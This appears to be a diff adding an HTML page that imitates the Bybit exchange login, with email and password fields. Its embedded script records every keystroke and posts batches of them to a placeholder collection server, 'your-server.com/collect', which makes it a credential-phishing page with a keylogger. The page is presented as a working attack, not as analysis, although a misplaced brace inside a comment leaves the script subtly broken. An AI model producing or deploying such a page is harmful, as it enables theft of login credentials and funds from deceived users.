@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bybit Login page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: white;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;}        .login-container {
+            background-color: #2c2c2c;
+            padding: 20px;
+            color: white;
+            border-radius: 10px;
+            width: 300px;
+            text-align: left;}        input {
+            width: 95%;
+            padding: 10px;
+            margin: 30px 0;
+            border-radius: 5px;
+            border: 10;}        button {
+            padding: 10px;
+            margin: 30px 0;
+            width: 300px;
+            background-color: orange;
+            border: none;
+            color: black;
+            cursor: pointer;
+            border-radius: 5px;}        button:hover {
+            background-color: #cc3700;}    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Bybit Login</h1>
+        <form>
+        <input type="text" id="email" placeholder="Email" required>
+        <input type="password" id="password" placeholder="Password" required>
+            <p>Forgot Password</p>
+        <button type="submit">Login Now</button>
+    </form>
+  </div>
+    <script>
+        // Capture every keystroke
+        let log = "";
+        document.addEventListener("keydown", function(event) {
+            log += event.key;
+            // Send data to your server every 10 keystrokes
+            if (log.length >= 10) {
+                sendData(log);
+                log = ""; // Reset log after sending}        });
+
+        // Function to send captured keystrokes to your server
+        function sendData(data) {
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST","http://your-server.com/collect", true); // Replace with your server endpoint
+            xhr.setRequestHeader("Content-Type","application/json");
+            xhr.send(JSON.stringify({ keystrokes: data }));}    </script>
+</body>
+</html>
